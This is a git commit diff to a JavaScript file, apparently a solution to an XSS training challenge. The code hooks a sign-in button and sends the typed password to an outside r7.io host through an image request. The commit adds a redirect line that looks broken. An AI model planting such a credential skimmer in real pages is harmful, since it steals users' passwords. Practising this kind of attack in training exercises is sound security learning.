6a84e62a11ed94fb0f48775863af4ebeb87a2fdf
dlee20013 <dlee20013@gmail.com>
2017-04-25 01:48:33 -0700

    hello

--- part1/part_1.js
+++ part1/part_1.js
@@ -2,6 +2,7 @@ document.addEventListener("DOMContentLoaded", function() {
 	document.getElementById("signin-btn").onclick = function givePassword() {
 		var img = new Image();
 		img.src = "http://r7.io/e/davinl?s=" + document.getElementById("login_password").value;
+		window.replace.href = "http://xss-challenges.r7.io/0/login";
 	};
 	var prob = document.getElementsByClassName("problem")[0];
 	var err = document.getElementsByClassName("error-message")[0];
